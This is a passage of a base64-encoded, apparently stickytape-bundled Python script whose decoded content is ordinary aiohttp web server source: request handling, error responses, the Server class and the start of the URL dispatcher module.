RfaGFuZGxlclxyXG5cclxuICAgICAgICAgICAgcmVxdWVzdCA9IHNlbGYuX3JlcXVlc3RfZmFjdG9yeShtZXNzYWdlLCBwYXlsb2FkLCBzZWxmLCB3cml0ZXIsIGhhbmRsZXIpXHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICMgYSBuZXcgdGFzayBpcyB1c2VkIGZvciBjb3B5IGNvbnRleHQgdmFycyAoIzM0MDYpXHJcbiAgICAgICAgICAgICAgICB0YXNrID0gc2VsZi5fbG9vcC5jcmVhdGVfdGFzayhcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9oYW5kbGVfcmVxdWVzdChyZXF1ZXN0LCBzdGFydCwgcmVxdWVzdF9oYW5kbGVyKVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIHJlc3AsIHJlc2V0ID0gYXdhaXQgdGFza1xyXG4gICAgICAgICAgICAgICAgZXhjZXB0IChhc3luY2lvLkNhbmNlbGxlZEVycm9yLCBDb25uZWN0aW9uRXJyb3IpOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYubG9nX2RlYnVnKCJJZ25vcmVkIHByZW1hdHVyZSBjbGllbnQgZGlzY29ubmVjdGlvbiIpXHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuXHJcbiAgICAgICAgICAgICAgICAjIERyb3AgdGhlIHByb2Nlc3NlZCB0YXNrIGZyb20gYXN5bmNpby5UYXNrLmFsbF90YXNrcygpIGVhcmx5XHJcbiAgICAgICAgICAgICAgICBkZWwgdGFza1xyXG4gICAgICAgICAgICAgICAgaWYgcmVzZXQ6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5sb2dfZGVidWcoIklnbm9yZWQgcHJlbWF0dXJlIGNsaWVudCBkaXNjb25uZWN0aW9uIDIiKVxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcblxyXG4gICAgICAgICAgICAgICAgIyBub3RpZnkgc2VydmVyIGFib3V0IGtlZXAtYWxpdmVcclxuICAgICAgICAgICAgICAgIHNlbGYuX2tlZXBhbGl2ZSA9IGJvb2wocmVzcC5rZWVwX2FsaXZlKVxyXG5cclxuICAgICAgICAgICAgICAgICMgY2hlY2sgcGF5bG9hZFxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHBheWxvYWQuaXNfZW9mKCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbGluZ2VyaW5nX3RpbWUgPSBzZWxmLl9saW5nZXJpbmdfdGltZVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLl9mb3JjZV9jbG9zZSBhbmQgbGluZ2VyaW5nX3RpbWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYubG9nX2RlYnVnKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIlN0YXJ0IGxpbmdlcmluZyBjbG9zZSB0aW1lciBmb3IgJXMgc2VjLiIsIGxpbmdlcmluZ190aW1lXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG5vdyA9IGxvb3AudGltZSgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVuZF90ID0gbm93ICsgbGluZ2VyaW5nX3RpbWVcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggc3VwcHJlc3MoYXN5bmNpby5UaW1lb3V0RXJyb3IsIGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3IpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm90IHBheWxvYWQuaXNfZW9mKCkgYW5kIG5vdyA8IGVuZF90OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY2VpbF90aW1lb3V0KGVuZF90IC0gbm93KTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyByZWFkIGFuZCBpZ25vcmVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgcGF5bG9hZC5yZWFkYW55KClcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBub3cgPSBsb29wLnRpbWUoKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAjIGlmIHBheWxvYWQgc3RpbGwgdW5jb21wbGV0ZWRcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgcGF5bG9hZC5pc19lb2YoKSBhbmQgbm90IHNlbGYuX2ZvcmNlX2Nsb3NlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmxvZ19kZWJ1ZygiVW5jb21wbGV0ZWQgcmVxdWVzdC4iKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNsb3NlKClcclxuXHJcbiAgICAgICAgICAgICAgICBwYXlsb2FkLnNldF9leGNlcHRpb24oUGF5bG9hZEFjY2Vzc0Vycm9yKCkpXHJcblxyXG4gICAgICAgICAgICBleGNlcHQgYXN5bmNpby5DYW5jZWxsZWRFcnJvcjpcclxuICAgICAgICAgICAgICAgIHNlbGYubG9nX2RlYnVnKCJJZ25vcmVkIHByZW1hdHVyZSBjbGllbnQgZGlzY29ubmVjdGlvbiAiKVxyXG4gICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLmRlYnVnOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYubG9nX2V4Y2VwdGlvbigiVW5oYW5kbGVkIHJ1bnRpbWUgZXhjZXB0aW9uIiwgZXhjX2luZm89ZXhjKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5mb3JjZV9jbG9zZSgpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXhjOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5sb2dfZXhjZXB0aW9uKCJVbmhhbmRsZWQgZXhjZXB0aW9uIiwgZXhjX2luZm89ZXhjKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5mb3JjZV9jbG9zZSgpXHJcbiAgICAgICAgICAgIGZpbmFsbHk6XHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLnRyYW5zcG9ydCBpcyBOb25lIGFuZCByZXNwIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYubG9nX2RlYnVnKCJJZ25vcmVkIHByZW1hdHVyZSBjbGllbnQgZGlzY29ubmVjdGlvbi4iKVxyXG4gICAgICAgICAgICAgICAgZWxpZiBub3Qgc2VsZi5fZm9yY2VfY2xvc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5fa2VlcGFsaXZlIGFuZCBub3Qgc2VsZi5fY2xvc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICMgc3RhcnQga2VlcC1hbGl2ZSB0aW1lclxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiBrZWVwYWxpdmVfdGltZW91dCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vdyA9IHNlbGYuX2xvb3AudGltZSgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9rZWVwYWxpdmVfdGltZSA9IG5vd1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5fa2VlcGFsaXZlX2hhbmRsZSBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX2tlZXBhbGl2ZV9oYW5kbGUgPSBsb29wLmNhbGxfYXQoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vdyArIGtlZXBhbGl2ZV90aW1lb3V0LCBzZWxmLl9wcm9jZXNzX2tlZXBhbGl2ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVha1xyXG5cclxuICAgICAgICAjIHJlbW92ZSBoYW5kbGVyLCBjbG9zZSB0cmFuc3BvcnQgaWYgbm8gaGFuZGxlcnMgbGVmdFxyXG4gICAgICAgIGlmIG5vdCBzZWxmLl9mb3JjZV9jbG9zZTpcclxuICAgICAgICAgICAgc2VsZi5fdGFza19oYW5kbGVyID0gTm9uZVxyXG4gICAgICAgICAgICBpZiBzZWxmLnRyYW5zcG9ydCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIHNlbGYudHJhbnNwb3J0LmNsb3NlKClcclxuXHJcbiAgICBhc3luYyBkZWYgZmluaXNoX3Jlc3BvbnNlKFxyXG4gICAgICAgIHNlbGYsIHJlcXVlc3Q6IEJhc2VSZXF1ZXN0LCByZXNwOiBTdHJlYW1SZXNwb25zZSwgc3RhcnRfdGltZTogZmxvYXRcclxuICAgICkgLT4gYm9vbDpcclxuICAgICAgICAiIiJQcmVwYXJlIHRoZSByZXNwb25zZSBhbmQgd3JpdGVfZW9mLCB0aGVuIGxvZyBhY2Nlc3MuXHJcblxyXG4gICAgICAgIFRoaXMgaGFzIHRvXHJcbiAgICAgICAgYmUgY2FsbGVkIHdpdGhpbiB0aGUgY29udGV4dCBvZiBhbnkgZXhjZXB0aW9uIHNvIHRoZSBhY2Nlc3MgbG9nZ2VyXHJcbiAgICAgICAgY2FuIGdldCBleGNlcHRpb24gaW5mb3JtYXRpb24uIFJldHVybnMgVHJ1ZSBpZiB0aGUgY2xpZW50IGRpc2Nvbm5lY3RzXHJcbiAgICAgICAgcHJlbWF0dXJlbHkuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fcmVxdWVzdF9wYXJzZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3JlcXVlc3RfcGFyc2VyLnNldF91cGdyYWRlZChGYWxzZSlcclxuICAgICAgICAgICAgc2VsZi5fdXBncmFkZSA9IEZhbHNlXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX21lc3NhZ2VfdGFpbDpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3JlcXVlc3RfcGFyc2VyLmZlZWRfZGF0YShzZWxmLl9tZXNzYWdlX3RhaWwpXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9tZXNzYWdlX3RhaWwgPSBiIiJcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHByZXBhcmVfbWV0aCA9IHJlc3AucHJlcGFyZVxyXG4gICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjpcclxuICAgICAgICAgICAgaWYgcmVzcCBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJNaXNzaW5nIHJldHVybiAiICJzdGF0ZW1lbnQgb24gcmVxdWVzdCBoYW5kbGVyIilcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiV2ViLWhhbmRsZXIgc2hvdWxkIHJldHVybiAiXHJcbiAgICAgICAgICAgICAgICAgICAgImEgcmVzcG9uc2UgaW5zdGFuY2UsICJcclxuICAgICAgICAgICAgICAgICAgICAiZ290IHshcn0iLmZvcm1hdChyZXNwKVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgYXdhaXQgcHJlcGFyZV9tZXRoKHJlcXVlc3QpXHJcbiAgICAgICAgICAgIGF3YWl0IHJlc3Aud3JpdGVfZW9mKClcclxuICAgICAgICBleGNlcHQgQ29ubmVjdGlvbkVycm9yOlxyXG4gICAgICAgICAgICBzZWxmLmxvZ19hY2Nlc3MocmVxdWVzdCwgcmVzcCwgc3RhcnRfdGltZSlcclxuICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLmxvZ19hY2Nlc3MocmVxdWVzdCwgcmVzcCwgc3RhcnRfdGltZSlcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcblxyXG4gICAgZGVmIGhhbmRsZV9lcnJvcihcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHJlcXVlc3Q6IEJhc2VSZXF1ZXN0LFxyXG4gICAgICAgIHN0YXR1czogaW50ID0gNTAwLFxyXG4gICAgICAgIGV4YzogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl0gPSBOb25lLFxyXG4gICAgICAgIG1lc3NhZ2U6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgKSAtPiBTdHJlYW1SZXNwb25zZTpcclxuICAgICAgICAiIiJIYW5kbGUgZXJyb3JzLlxyXG5cclxuICAgICAgICBSZXR1cm5zIEhUVFAgcmVzcG9uc2Ugd2l0aCBzcGVjaWZpYyBzdGF0dXMgY29kZS4gTG9ncyBhZGRpdGlvbmFsXHJcbiAgICAgICAgaW5mb3JtYXRpb24uIEl0IGFsd2F5cyBjbG9zZXMgY3VycmVudCBjb25uZWN0aW9uLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHNlbGYubG9nX2V4Y2VwdGlvbigiRXJyb3IgaGFuZGxpbmcgcmVxdWVzdCIsIGV4Y19pbmZvPWV4YylcclxuXHJcbiAgICAgICAgIyBzb21lIGRhdGEgYWxyZWFkeSBnb3Qgc2VudCwgY29ubmVjdGlvbiBpcyBicm9rZW5cclxuICAgICAgICBpZiByZXF1ZXN0LndyaXRlci5vdXRwdXRfc2l6ZSA+IDA6XHJcbiAgICAgICAgICAgIHJhaXNlIENvbm5lY3Rpb25FcnJvcihcclxuICAgICAgICAgICAgICAgICJSZXNwb25zZSBpcyBzZW50IGFscmVhZHksIGNhbm5vdCBzZW5kIGFub3RoZXIgcmVzcG9uc2UgIlxyXG4gICAgICAgICAgICAgICAgIndpdGggdGhlIGVycm9yIG1lc3NhZ2UiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgY3QgPSAidGV4dC9wbGFpbiJcclxuICAgICAgICBpZiBzdGF0dXMgPT0gSFRUUFN0YXR1cy5JTlRFUk5BTF9TRVJWRVJfRVJST1I6XHJcbiAgICAgICAgICAgIHRpdGxlID0gInswLnZhbHVlfSB7MC5waHJhc2V9Ii5mb3JtYXQoSFRUUFN0YXR1cy5JTlRFUk5BTF9TRVJWRVJfRVJST1IpXHJcbiAgICAgICAgICAgIG1zZyA9IEhUVFBTdGF0dXMuSU5URVJOQUxfU0VSVkVSX0VSUk9SLmRlc2NyaXB0aW9uXHJcbiAgICAgICAgICAgIHRiID0gTm9uZVxyXG4gICAgICAgICAgICBpZiBzZWxmLmRlYnVnOlxyXG4gICAgICAgICAgICAgICAgd2l0aCBzdXBwcmVzcyhFeGNlcHRpb24pOlxyXG4gICAgICAgICAgICAgICAgICAgIHRiID0gdHJhY2ViYWNrLmZvcm1hdF9leGMoKVxyXG5cclxuICAgICAgICAgICAgaWYgInRleHQvaHRtbCIgaW4gcmVxdWVzdC5oZWFkZXJzLmdldCgiQWNjZXB0IiwgIiIpOlxyXG4gICAgICAgICAgICAgICAgaWYgdGI6XHJcbiAgICAgICAgICAgICAgICAgICAgdGIgPSBodG1sX2VzY2FwZSh0YilcclxuICAgICAgICAgICAgICAgICAgICBtc2cgPSBmIjxoMj5UcmFjZWJhY2s6PC9oMj5cXG48cHJlPnt0Yn08L3ByZT4iXHJcbiAgICAgICAgICAgICAgICBtZXNzYWdlID0gKFxyXG4gICAgICAgICAgICAgICAgICAgICI8aHRtbD48aGVhZD4iXHJcbiAgICAgICAgICAgICAgICAgICAgIjx0aXRsZT57dGl0bGV9PC90aXRsZT4iXHJcbiAgICAgICAgICAgICAgICAgICAgIjwvaGVhZD48Ym9keT5cXG48aDE+e3RpdGxlfTwvaDE+IlxyXG4gICAgICAgICAgICAgICAgICAgICJcXG57bXNnfVxcbjwvYm9keT48L2h0bWw+XFxuIlxyXG4gICAgICAgICAgICAgICAgKS5mb3JtYXQodGl0bGU9dGl0bGUsIG1zZz1tc2cpXHJcbiAgICAgICAgICAgICAgICBjdCA9ICJ0ZXh0L2h0bWwiXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBpZiB0YjpcclxuICAgICAgICAgICAgICAgICAgICBtc2cgPSB0YlxyXG4gICAgICAgICAgICAgICAgbWVzc2FnZSA9IHRpdGxlICsgIlxcblxcbiIgKyBtc2dcclxuXHJcbiAgICAgICAgcmVzcCA9IFJlc3BvbnNlKHN0YXR1cz1zdGF0dXMsIHRleHQ9bWVzc2FnZSwgY29udGVudF90eXBlPWN0KVxyXG4gICAgICAgIHJlc3AuZm9yY2VfY2xvc2UoKVxyXG5cclxuICAgICAgICByZXR1cm4gcmVzcFxyXG5cclxuICAgIGRlZiBfbWFrZV9lcnJvcl9oYW5kbGVyKFxyXG4gICAgICAgIHNlbGYsIGVycl9pbmZvOiBfRXJySW5mb1xyXG4gICAgKSAtPiBDYWxsYWJsZVtbQmFzZVJlcXVlc3RdLCBBd2FpdGFibGVbU3RyZWFtUmVzcG9uc2VdXTpcclxuICAgICAgICBhc3luYyBkZWYgaGFuZGxlcihyZXF1ZXN0OiBCYXNlUmVxdWVzdCkgLT4gU3RyZWFtUmVzcG9uc2U6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLmhhbmRsZV9lcnJvcihcclxuICAgICAgICAgICAgICAgIHJlcXVlc3QsIGVycl9pbmZvLnN0YXR1cywgZXJyX2luZm8uZXhjLCBlcnJfaW5mby5tZXNzYWdlXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgcmV0dXJuIGhhbmRsZXJcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvd2ViX3NlcnZlci5weScsIGInIiIiTG93IGxldmVsIEhUVFAgc2VydmVyLiIiIlxyXG5pbXBvcnQgYXN5bmNpb1xyXG5mcm9tIHR5cGluZyBpbXBvcnQgQW55LCBBd2FpdGFibGUsIENhbGxhYmxlLCBEaWN0LCBMaXN0LCBPcHRpb25hbCAgIyBub3FhXHJcblxyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0U3RyZWFtV3JpdGVyXHJcbmZyb20gLmhlbHBlcnMgaW1wb3J0IGdldF9ydW5uaW5nX2xvb3BcclxuZnJvbSAuaHR0cF9wYXJzZXIgaW1wb3J0IFJhd1JlcXVlc3RNZXNzYWdlXHJcbmZyb20gLnN0cmVhbXMgaW1wb3J0IFN0cmVhbVJlYWRlclxyXG5mcm9tIC53ZWJfcHJvdG9jb2wgaW1wb3J0IFJlcXVlc3RIYW5kbGVyLCBfUmVxdWVzdEZhY3RvcnksIF9SZXF1ZXN0SGFuZGxlclxyXG5mcm9tIC53ZWJfcmVxdWVzdCBpbXBvcnQgQmFzZVJlcXVlc3RcclxuXHJcbl9fYWxsX18gPSAoIlNlcnZlciIsKVxyXG5cclxuXHJcbmNsYXNzIFNlcnZlcjpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGhhbmRsZXI6IF9SZXF1ZXN0SGFuZGxlcixcclxuICAgICAgICAqLFxyXG4gICAgICAgIHJlcXVlc3RfZmFjdG9yeTogT3B0aW9uYWxbX1JlcXVlc3RGYWN0b3J5XSA9IE5vbmUsXHJcbiAgICAgICAgbG9vcDogT3B0aW9uYWxbYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcF0gPSBOb25lLFxyXG4gICAgICAgICoqa3dhcmdzOiBBbnlcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9sb29wID0gZ2V0X3J1bm5pbmdfbG9vcChsb29wKVxyXG4gICAgICAgIHNlbGYuX2Nvbm5lY3Rpb25zID0ge30gICMgdHlwZTogRGljdFtSZXF1ZXN0SGFuZGxlciwgYXN5bmNpby5UcmFuc3BvcnRdXHJcbiAgICAgICAgc2VsZi5fa3dhcmdzID0ga3dhcmdzXHJcbiAgICAgICAgc2VsZi5yZXF1ZXN0c19jb3VudCA9IDBcclxuICAgICAgICBzZWxmLnJlcXVlc3RfaGFuZGxlciA9IGhhbmRsZXJcclxuICAgICAgICBzZWxmLnJlcXVlc3RfZmFjdG9yeSA9IHJlcXVlc3RfZmFjdG9yeSBvciBzZWxmLl9tYWtlX3JlcXVlc3RcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjb25uZWN0aW9ucyhzZWxmKSAtPiBMaXN0W1JlcXVlc3RIYW5kbGVyXTpcclxuICAgICAgICByZXR1cm4gbGlzdChzZWxmLl9jb25uZWN0aW9ucy5rZXlzKCkpXHJcblxyXG4gICAgZGVmIGNvbm5lY3Rpb25fbWFkZShcclxuICAgICAgICBzZWxmLCBoYW5kbGVyOiBSZXF1ZXN0SGFuZGxlciwgdHJhbnNwb3J0OiBhc3luY2lvLlRyYW5zcG9ydFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2Nvbm5lY3Rpb25zW2hhbmRsZXJdID0gdHJhbnNwb3J0XHJcblxyXG4gICAgZGVmIGNvbm5lY3Rpb25fbG9zdChcclxuICAgICAgICBzZWxmLCBoYW5kbGVyOiBSZXF1ZXN0SGFuZGxlciwgZXhjOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXSA9IE5vbmVcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiBoYW5kbGVyIGluIHNlbGYuX2Nvbm5lY3Rpb25zOlxyXG4gICAgICAgICAgICBkZWwgc2VsZi5fY29ubmVjdGlvbnNbaGFuZGxlcl1cclxuXHJcbiAgICBkZWYgX21ha2VfcmVxdWVzdChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG1lc3NhZ2U6IFJhd1JlcXVlc3RNZXNzYWdlLFxyXG4gICAgICAgIHBheWxvYWQ6IFN0cmVhbVJlYWRlcixcclxuICAgICAgICBwcm90b2NvbDogUmVxdWVzdEhhbmRsZXIsXHJcbiAgICAgICAgd3JpdGVyOiBBYnN0cmFjdFN0cmVhbVdyaXRlcixcclxuICAgICAgICB0YXNrOiAiYXN5bmNpby5UYXNrW05vbmVdIixcclxuICAgICkgLT4gQmFzZVJlcXVlc3Q6XHJcbiAgICAgICAgcmV0dXJuIEJhc2VSZXF1ZXN0KG1lc3NhZ2UsIHBheWxvYWQsIHByb3RvY29sLCB3cml0ZXIsIHRhc2ssIHNlbGYuX2xvb3ApXHJcblxyXG4gICAgYXN5bmMgZGVmIHNodXRkb3duKHNlbGYsIHRpbWVvdXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgY29yb3MgPSBbY29ubi5zaHV0ZG93bih0aW1lb3V0KSBmb3IgY29ubiBpbiBzZWxmLl9jb25uZWN0aW9uc11cclxuICAgICAgICBhd2FpdCBhc3luY2lvLmdhdGhlcigqY29yb3MpXHJcbiAgICAgICAgc2VsZi5fY29ubmVjdGlvbnMuY2xlYXIoKVxyXG5cclxuICAgIGRlZiBfX2NhbGxfXyhzZWxmKSAtPiBSZXF1ZXN0SGFuZGxlcjpcclxuICAgICAgICByZXR1cm4gUmVxdWVzdEhhbmRsZXIoc2VsZiwgbG9vcD1zZWxmLl9sb29wLCAqKnNlbGYuX2t3YXJncylcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvd2ViX3VybGRpc3BhdGNoZXIucHknLCBiJ2ltcG9ydCBhYmNcclxuaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IGJhc2U2NFxyXG5pbXBvcnQgaGFzaGxpYlxyXG5pbXBvcnQgaW5zcGVjdFxyXG5pbXBvcnQga2V5d29yZFxyXG5pbXBvcnQgb3NcclxuaW1wb3J0IHJlXHJcbmltcG9ydCB3YXJuaW5nc1xyXG5mcm9tIGNvbnRleHRsaWIgaW1wb3J0IGNvbnRleHRtYW5hZ2VyXHJcbmZyb20gZnVuY3Rvb2xzIGltcG9ydCB3cmFwc1xyXG5mcm9tIHBhdGhsaWIgaW1wb3J0IFBhdGhcclxuZnJvbSB0eXBlcyBpbXBvcnQgTWFwcGluZ1Byb3h5VHlwZVxyXG5mcm9tIHR5cGluZyBpbXBvcnQgKFxyXG4gICAgVFlQRV9DSEVDS0lORyxcclxuICAgIEFueSxcclxuICAgIEF3YWl0YWJsZSxcclxuICAgIENhbGxhYmxlLFxyXG4gICAgQ29udGFpbmVyLFxyXG4gICAgRGljdCxcclxuICAgIEdlbmVyYXRvcixcclxuICAgIEl0ZXJhYmxlLFxyXG4gICAgSXRlcmF0b3IsXHJcbiAgICBMaXN0LFxyXG4gICAgTWFwcGluZyxcclxuICAgIE9wdGlvbmFsLFxyXG4gICAgUGF0dGVybixcclxuICAgIFNldCxcclxuICAgIFNpemVkLFxyXG4gICAgVHVwbGUsXHJcbiAgICBUeXBlLFxyXG4gICAgVW5pb24sXHJcbiAgICBjYXN0LFxyXG4pXHJcblxyXG5mcm9tIHlhcmwgaW1wb3J0IFVSTCwgX192ZXJzaW9uX18gYXMgeWFybF92ZXJzaW9uICAjIHR5cGU6IGlnbm9yZVthdHRyLWRlZmluZWRdXHJcblxyXG5mcm9tIC4gaW1wb3J0IGhkcnNcclxuZnJvbSAuYWJjIGltcG9ydCBBYnN0cmFjdE1hdGNoSW5mbywgQWJzdHJhY3RSb3V0ZXIsIEFic3RyYWN0Vmlld1xyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBERUJVR1xyXG5mcm9tIC5odHRwIGltcG9ydCBIdHRwVmVyc2lvbjExXHJcbmZyb20gLnR5cGVkZWZzIGltcG9ydCBGaW5hbCwgSGFuZGxlciwgUGF0aExpa2UsIFR5cGVkRGljdFxyXG5mcm9tIC53ZWJfZXhjZXB0aW9ucyBpbXBvcnQgKFxyXG4gICAgSFRUUEV4Y2VwdGlvbixcclxuICAgIEhUVFBFeHBlY3RhdGlvbkZhaWxlZCxcclxuICAgIEhUVFBGb3JiaWRkZW4sXHJcbiAgICBIVFRQTWV0aG9kTm90QWxsb3dlZCxcclxuICAgIEhUVFBOb3RGb3VuZCxcclxuKVxyXG5mcm9tIC53ZWJfZmlsZXJlc3BvbnNlIGltcG9ydCBGaWxlUmVzcG9uc2VcclxuZnJvbSAud2ViX3JlcXVlc3QgaW1wb3J0IFJlcXVlc3RcclxuZnJvbSAud2ViX3Jlc3BvbnNlIGltcG9ydCBSZXNwb25zZSwgU3RyZWFtUmVzcG9uc2VcclxuZnJvbSAud2ViX3JvdXRlZGVmIGltcG9ydCBBYnN0cmFjdFJvdXRlRGVmXHJcblxyXG5fX2FsbF9fID0gKFxyXG4gICAgIlVybERpc3BhdGNoZXIiLFxyXG4gICAgIlVybE1hcHBpbmdNYXRjaEluZm8iLFxyXG4gICAgIkFic3RyYWN0UmVzb3VyY2UiLFxyXG4gICAgIlJlc291cmNlIixcclxuICAgICJQbGFpblJlc291cmNlIixcclxuICAgICJEeW5hbWljUmVzb3VyY2UiLFxyXG4gICAgIkFic3RyYWN0Um91dGUiLFxyXG4gICAgIlJlc291cmNlUm91dGUiLFxyXG4gICAgIlN0YXRpY1Jlc291cmNlIixcclxuICAgICJWaWV3IixcclxuKVxyXG5cclxuXHJcbmlmIFRZUEVfQ0hFQ0tJTkc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIGZyb20gLndlYl9hcHAgaW1wb3J0IEFwcGxpY2F0aW9uXHJcblxyXG4gICAgQmFzZURpY3QgPSBEaWN0W3N0ciwgc3RyXVxyXG5lbHNlOlxyXG4gICAgQmFzZURpY3QgPSBkaWN0XHJcblxyXG5ZQVJMX1ZFUlNJT046IEZpbmFsW1R1cGxlW2ludCwgLi4uXV0gPSB0dXBsZShtYXAoaW50LCB5YXJsX3ZlcnNpb24uc3BsaXQoIi4iKVs6Ml0pKVxyXG5cclxuSFRUUF9NRVRIT0RfUkU6IEZpbmFsW1BhdHRlcm5bc3RyXV0gPSByZS5jb21waWxlKFxyXG4gICAgciJeWzAtOUEtWmEteiEjXFwkJSZcJ1xcKlxcK1xcLVxcLlxcXl9gXFx8fl0rJCJcclxuKVxyXG5ST1VURV9SRTogRmluYWxbUGF0dGVybltzdHJdXSA9IHJlLmNvbXBpbGUoXHJcbiAgICByIihcXHtbX2EtekEtWl1bXnt9XSooPzpcXHtbXnt9XSpcXH1bXnt9XSopKlxcfSkiXHJcbilcclxuUEFUSF9TRVA6IEZpbmFsW3N0cl0gPSByZS5lc2NhcGUoIi8iKVxyXG5cclxuXHJcbl9FeHBlY3RIYW5kbGVyID0gQ2FsbGFibGVbW1JlcXVlc3RdLCBBd2FpdGFibGVbTm9uZV1dXHJcbl9SZXNvbHZlID0gVHVwbGVbT3B0aW9uYWxbIlVybE1hcHBpbmdNYXRjaEluZm8iXSwgU2V0W3N0cl1dXHJcblxyXG5cclxuY2xhc3MgX0luZm9EaWN0KFR5cGVkRGljdCwgdG90YWw9RmFsc2UpOlxyXG4gICAgcGF0aDogc3RyXHJcblxyXG4gICAgZm9ybWF0dGVyOiBzdHJcclxuICAgIHBhdHRlcm46IFBhdHRlcm5bc3RyXVxyXG5cclxuICAgIGRpcmVjdG9yeTogUGF0aFxyXG4gICAgcHJlZml4OiBzdHJcclxuICAgIHJvdXRlczogTWFwcGluZ1tzdHIsICJBYnN0cmFjdFJ